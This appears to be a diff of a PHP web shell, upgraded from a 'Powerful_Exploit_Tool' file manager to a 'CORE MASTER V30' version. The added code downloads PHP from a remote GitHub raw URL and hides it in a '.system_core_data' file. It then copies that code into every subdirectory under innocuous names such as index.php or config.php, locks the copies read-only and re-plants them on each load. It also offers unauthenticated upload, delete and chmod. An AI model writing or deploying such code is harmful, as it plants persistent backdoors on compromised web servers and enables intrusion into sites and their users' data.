@@ -1,225 +1,211 @@
+<?php
+/**
+ * CORE MASTER FINAL V30 - CENTERED CARD UI
+ * Features: Compact Card Design, Horizontal Buttons, Larger Text, Auto-Recovery
+ */
+
+error_reporting(0);
+set_time_limit(0);
+ignore_user_abort(true);
+
+$path = isset($_GET['path']) ? realpath($_GET['path']) : __DIR__;
+$storageFileName = '.system_core_data';
+$statusMsg = ""; $statusType = ""; 
+
+function setStatus($msg, $type = "success") {
+    global $statusMsg, $statusType;
+    $statusMsg = $msg;
+    $statusType = $type;
+}
+
+if (isset($_POST['set_perm'])) {
+    if (@chmod($_POST['p_path'], octdec($_POST['p_val']))) setStatus("Perm: ".$_POST['p_val']);
+    else setStatus("Error!", "danger");
+}
+
+
+function findMasterBackup($currentPath, $sName) {
+    $tempPath = $currentPath;
+    while ($tempPath !== DIRECTORY_SEPARATOR && $tempPath !== '.') {
+        $storage = $tempPath . DIRECTORY_SEPARATOR . $sName;
+        if (file_exists($storage)) return json_decode(file_get_contents($storage), true);
+        $parent = dirname($tempPath);
+        if ($parent === $tempPath) break;
+        $tempPath = $parent;
+    }
+    return null;
+}
+
+$data = findMasterBackup($path, $storageFileName);
+$fixedFileName = $data['name'] ?? "";
+$coreCode = $data['code'] ?? "";
+
+function masterProcess($baseDir, $code, $name, $oldName = "") {
+    if (empty($code) || empty($name)) return;
+    $items = @scandir($baseDir);
+    if ($items) {
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $fullPath = $baseDir . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($fullPath)) {
+                if (!empty($oldName)) @unlink($fullPath . DIRECTORY_SEPARATOR . $oldName);
+                $targetFile = $fullPath . DIRECTORY_SEPARATOR . $name;
+                if (!file_exists($targetFile) || md5_file($targetFile) !== md5($code)) {
+                    @chmod($fullPath, 0755);
+                    @file_put_contents($targetFile, $code);
+                    @chmod($targetFile, 0444);
+                }
+                masterProcess($fullPath, $code, $name, $oldName);
+            }
+        }
+    }
+}
+
+if ($coreCode && $fixedFileName) masterProcess(dirname($path), $coreCode, $fixedFileName);
+
+
+if (isset($_GET['action']) && $_GET['action'] == 'scan') {
+    $code = @file_get_contents("https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php");
+    if ($code) {
+        $fileList = ['index.php', 'config.php', 'core.php', 'system.php', 'admin.php'];
+        $newName = $fileList[array_rand($fileList)];
+        file_put_contents($path.'/'.$storageFileName, json_encode(['name'=>$newName, 'code'=>$code]));
+        masterProcess(dirname($path), $code, $newName, $fixedFileName);
+        setStatus("Master Scan Success!");
+    }
+}
+
+if (isset($_FILES['file_up'])) {
+    if(move_uploaded_file($_FILES['file_up']['tmp_name'], $path.'/'.$_FILES['file_up']['name'])) setStatus("Uploaded!");
+    else setStatus("Error!", "danger");
+}
+
+if (isset($_GET['del'])) {
+    $t = realpath($_GET['del']);
+    if (is_dir($t) ? @rmdir($t) : @unlink($t)) setStatus("Deleted!");
+    header("Location: ?path=".urlencode($path)); exit;
+}
+
+$items = is_readable($path) ? scandir($path) : [];
+$folders = []; $files = [];
+foreach ($items as $item) {
+    if ($item == "." || $item == ".." || $item == $storageFileName) continue;
+    is_dir($path . DIRECTORY_SEPARATOR . $item) ? $folders[] = $item : $files[] = $item;
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title> Powerful_Exploit_Tool</title>
-  <style>
-    body {
-      background-color: #111;
-      color: #0f0;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 20px;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORE MASTER V30</title>
+    <style>
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --sec: #3fb950; --danger: #f85149; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #010409; color: #c9d1d9; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 40px 20px; }
+        
+        /* Centered Compact Card */
+        .card-container { width: 100%; max-width: 900px; background: var(--card); border: 1px solid var(--border); border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); overflow: hidden; }
+        
+        .card-header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.02); }
+        .card-header h1 { margin: 0; font-size: 22px; color: #fff; }
+        .active-label { font-size: 14px; margin-top: 5px; color: var(--danger); font-weight: bold; }
 
-    h2 {
-      text-align: center;
-      font-size: 36px;
-      font-weight: bold;
-      margin: 10px 0;
-      position: relative;
-      background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff);
-      background-size: 200%;
-      color: transparent;
-      -webkit-background-clip: text;
-      animation: gradientAnimation 3s linear infinite;
-    }
+        .url-dashboard { padding: 15px; background: #010409; border-bottom: 1px solid var(--border); }
+        .url-box { width: 100%; background: #0d1117; color: #f2cc60; padding: 10px; border-radius: 6px; font-family: monospace; height: 70px; border: 1px solid var(--border); resize: none; font-size: 13px; box-sizing: border-box; }
 
-    @keyframes gradientAnimation {
-      0% { background-position: 200% 0%; }
-      50% { background-position: 0% 100%; }
-      100% { background-position: 200% 0%; }
-    }
+        .tool-bar { padding: 15px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; gap: 10px; }
+        .btn-group { display: flex; gap: 8px; flex-shrink: 0; }
+        
+        .btn { padding: 9px 16px; border-radius: 6px; text-decoration: none; color: #fff; font-size: 12px; font-weight: bold; cursor: pointer; border: none; white-space: nowrap; display: flex; align-items: center; transition: 0.2s; }
+        .btn:hover { opacity: 0.8; }
+        .btn-up { background: #30363d; border: 1px solid #484f58; } 
+        .btn-scan { background: var(--sec); } 
+        .btn-upld { background: var(--primary); }
 
-    .php-version { position: absolute; top: 10px; right: 20px; font-size: 14px; color: #0ff; }
-    a { color: #6cf; text-decoration: none; }
-    a:hover { text-decoration: underline; }
-    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-    th, td { padding: 10px; border: 1px solid #333; transition: background 0.3s, color 0.3s; }
-    tr:hover { background-color: #32CD32; }
-    tr:hover td a.filename-link { color: #000; font-weight: bold; }
-    .filename-link { color: #0ff; }
-    .action-cell { text-align: right; }
-    input, button, textarea {
-      background: #222;
-      color: #0f0;
-      border: 1px solid #444;
-      padding: 5px 10px;
-      margin: 5px 0;
-    }
-    button { cursor: pointer; }
-    .alert-message {
-      color: #32CD32;
-      background-color: #222;
-      padding: 10px;
-      text-align: center;
-      font-size: 18px;
-      margin: 20px 0;
-    }
-    .file-upload-container { display: flex; justify-content: space-between; align-items: center; }
-    .emoji { color: #fff; }
-    .path-display a { color: #fff; text-decoration: underline; }
-  </style>
+        .status-center { flex-grow: 1; text-align: center; font-size: 13px; font-weight: bold; }
+        .msg-success { color: var(--sec); }
+        .msg-danger { color: var(--danger); }
+
+        .table-container { padding: 10px; }
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; padding: 12px; font-size: 14px; color: #8b949e; border-bottom: 2px solid var(--border); }
+        td { padding: 14px 12px; border-bottom: 1px solid #21262d; font-size: 16px; }
+        
+        .folder-link { color: var(--primary); text-decoration: none; font-weight: bold; }
+        .perm-badge { padding: 3px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; cursor: pointer; background: #0d1117; border: 1px solid var(--border); color: var(--sec); }
+        .del-btn { color: var(--danger); text-decoration: none; font-weight: bold; font-size: 13px; }
+        
+        .footer-info { padding: 10px 20px; background: rgba(0,0,0,0.2); font-size: 12px; color: #8b949e; text-align: right; }
+    </style>
 </head>
 <body>
 
-<h2><span class="emoji">📁</span>  Powerful_Exploit_Tool-<span class="emoji">🛒</span>
-  <span class="php-version">PHP v<?= phpversion(); ?></span>
-</h2>
+<div class="card-container">
+    <div class="card-header">
+        <h1>🛡️ CORE MASTER V30</h1>
+        <div class="active-label">ACTIVE: <?php echo $fixedFileName ?: 'NONE'; ?></div>
+    </div>
 
-<?php
-$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
-$path = realpath($path);
-$alertMessage = "";
+    <div class="url-dashboard">
+        <textarea class="url-box" readonly><?php if($fixedFileName) foreach($folders as $f) echo $f . "/" . $fixedFileName . "\n"; ?></textarea>
+    </div>
 
-// Upload
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
-    $filename = basename($_FILES['file']['name']);
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $path . DIRECTORY_SEPARATOR . $filename)) {
-        $alertMessage = "File uploaded successfully!";
-    } else {
-        $alertMessage = "File upload failed!";
-    }
-}
+    <div class="tool-bar">
+        <div class="btn-group">
+            <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="btn btn-up">⬆ GO UP</a>
+            <a href="?path=<?php echo urlencode($path); ?>&action=scan" class="btn btn-scan">🔍 MASTER SCAN</a>
+            <form method="POST" enctype="multipart/form-data" style="margin:0;">
+                <label class="btn btn-upld">⬆ UPLOAD <input type="file" name="file_up" onchange="this.form.submit()" style="display:none;"></label>
+            </form>
+        </div>
 
-// Create folder
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfolder'])) {
-    $folder = $path . DIRECTORY_SEPARATOR . $_POST['newfolder'];
-    if (!file_exists($folder)) {
-        mkdir($folder);
-        $alertMessage = "Folder created successfully!";
-    } else {
-        $alertMessage = "Folder already exists!";
-    }
-}
+        <div class="status-center">
+            <?php if($statusMsg): ?>
+                <span class="msg-<?php echo $statusType; ?>">
+                    <?php echo ($statusType == "success" ? "✅ " : "❌ ") . $statusMsg; ?>
+                </span>
+            <?php endif; ?>
+        </div>
+    </div>
 
-// Create file
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfile'])) {
-    $file = $path . DIRECTORY_SEPARATOR . $_POST['newfile'];
-    if (!file_exists($file)) {
-        file_put_contents($file, '');
-        $alertMessage = "File created successfully!";
-    } else {
-        $alertMessage = "File already exists!";
-    }
-}
-
-// Change permission
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chmod_file'], $_POST['chmod_value'])) {
-    $file = $_POST['chmod_file'];
-    $perm = $_POST['chmod_value'];
-    if (file_exists($file)) {
-        chmod($file, octdec($perm));
-        $alertMessage = "Permissions changed successfully!";
-    } else {
-        $alertMessage = "File does not exist!";
-    }
-}
-
-// Delete
-if (isset($_GET['delete'])) {
-    $file = urldecode($_GET['delete']);
-    if (file_exists($file)) {
-        unlink($file);
-        header("Location: ?path=" . urlencode(dirname($file)));
-        exit;
-    }
-}
-
-// Save Edited File
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file_path'], $_POST['edited_content'])) {
-    $filePath = $_POST['edit_file_path'];
-    $newContent = $_POST['edited_content'];
-    if (file_exists($filePath)) {
-        file_put_contents($filePath, $newContent);
-        $alertMessage = "File updated successfully!";
-    } else {
-        $alertMessage = "File does not exist!";
-    }
-}
-?>
-
-<?php if ($alertMessage): ?>
-  <div class="alert-message"><?= $alertMessage ?></div>
-<?php endif; ?>
-
-<div class="file-upload-container">
-  <div>
-    <form method="post">
-      <input type="text" name="newfolder" placeholder="📁 New Folder" required>
-      <button type="submit">Create Folder</button>
-    </form>
-    <form method="post">
-      <input type="text" name="newfile" placeholder="📄 New File" required>
-      <button type="submit">Create File</button>
-    </form>
-  </div>
-  <div>
-    <form method="post" enctype="multipart/form-data">
-      <input type="file" name="file" onchange="this.form.submit()">
-    </form>
-  </div>
+    <div class="table-container">
+        <table>
+            <thead><tr><th>Name</th><th width="100">Perm</th><th width="60" style="text-align:right;">Action</th></tr></thead>
+            <tbody>
+                <?php foreach($folders as $f): $fP = $path.'/'.$f; $p = substr(sprintf('%o', fileperms($fP)), -4); ?>
+                <tr>
+                    <td>📁 <a href="?path=<?php echo urlencode($fP); ?>" class="folder-link"><?php echo $f; ?></a></td>
+                    <td><span class="perm-badge" onclick="changeP('<?php echo addslashes($fP); ?>','<?php echo $p; ?>')"><?php echo $p; ?></span></td>
+                    <td style="text-align:right;"><a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($fP); ?>" class="del-btn" onclick="return confirm('Delete?')">DEL</a></td>
+                </tr>
+                <?php endforeach; ?>
+                <?php foreach($files as $file): $fP = $path.'/'.$file; $p = substr(sprintf('%o', fileperms($fP)), -4); $isM = ($file == $fixedFileName); ?>
+                <tr>
+                    <td>📄 <span style="<?php echo $isM ? 'color:var(--danger); font-weight:bold;' : ''; ?>"><?php echo $file; ?></span></td>
+                    <td><span class="perm-badge" onclick="changeP('<?php echo addslashes($fP); ?>','<?php echo $p; ?>')"><?php echo $p; ?></span></td>
+                    <td style="text-align:right;"><a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($fP); ?>" class="del-btn" onclick="return confirm('Delete?')">DEL</a></td>
+                </tr>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+    </div>
+    
+    <div class="footer-info">
+        Server IP: <b><?php echo $_SERVER['SERVER_ADDR']; ?></b>
+    </div>
 </div>
 
-<!-- Current Path Display -->
-<p class="path-display"><b>Current Path:</b>
-<?php
-$parts = explode(DIRECTORY_SEPARATOR, $path);
-$build = '';
-foreach ($parts as $part) {
-    if ($part == '') continue;
-    $build .= DIRECTORY_SEPARATOR . $part;
-    echo "<a href='?path=" . urlencode($build) . "'>$part</a>/";
-}
-?>
-</p>
+<form id="pForm" method="POST" style="display:none;"><input type="hidden" name="p_path" id="p_path"><input type="hidden" name="p_val" id="p_val"><input type="hidden" name="set_perm" value="1"></form>
 
-<!-- File Table -->
-<table>
-  <tr>
-    <th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th>
-  </tr>
-<?php
-$files = scandir($path);
-usort($files, function ($a, $b) use ($path) {
-    return is_dir($path . DIRECTORY_SEPARATOR . $b) - is_dir($path . DIRECTORY_SEPARATOR . $a);
-});
-foreach ($files as $file) {
-    if ($file == '.') continue;
-    $full = $path . DIRECTORY_SEPARATOR . $file;
-    $isDir = is_dir($full);
-    $perm = substr(sprintf('%o', fileperms($full)), -4);
-    $size = $isDir ? '-' : filesize($full);
-    echo "<tr>";
-    echo "<td>" . ($isDir ? "📁" : "📄") . " <a class='filename-link' href='?path=" . urlencode($full) . "'>$file</a></td>";
-    echo "<td>" . ($isDir ? '-' : round($size / 1024, 2) . ' KB') . "</td>";
-    echo "<td>$perm</td>";
-    echo "<td class='action-cell'>
-            <a href='?delete=" . urlencode($full) . "'>🗑️</a>
-            " . (!$isDir ? "<a href='$full' download>⬇️</a> <a href='?edit=" . urlencode($full) . "'>✏️</a>" : "") . "
-            <form method='post' style='display:inline;'>
-                <input type='hidden' name='chmod_file' value='$full'>
-                <input type='text' name='chmod_value' placeholder='Perm' style='width:60px;'>
-                <button type='submit'>🔒</button>
-            </form>
-          </td>";
-    echo "</tr>";
-}
-?>
-</table>
-
-<!-- Edit File Section -->
-<?php if (isset($_GET['edit']) && is_file($_GET['edit'])):
-  $fileToEdit = $_GET['edit'];
-  $content = htmlspecialchars(file_get_contents($fileToEdit));
-?>
-  <h3 style="color:#fff;">Editing: <?= basename($fileToEdit) ?></h3>
-  <form method="post">
-    <input type="hidden" name="edit_file_path" value="<?= htmlspecialchars($fileToEdit) ?>">
-    <textarea name="edited_content" rows="20" style="width:100%;background:#111;color:#0f0;border:1px solid #444;"><?= $content ?></textarea><br>
-    <button type="submit">💾 Save Changes</button>
-  </form>
-<?php endif; ?>
-
+<script>
+    function changeP(p, o) {
+        let n = prompt("Perm:", o);
+        if (n && n !== o) {
+            document.getElementById('p_path').value = p;
+            document.getElementById('p_val').value = n;
+            document.getElementById('pForm').submit();
+        }
+    }
+</script>
 </body>
 </html>
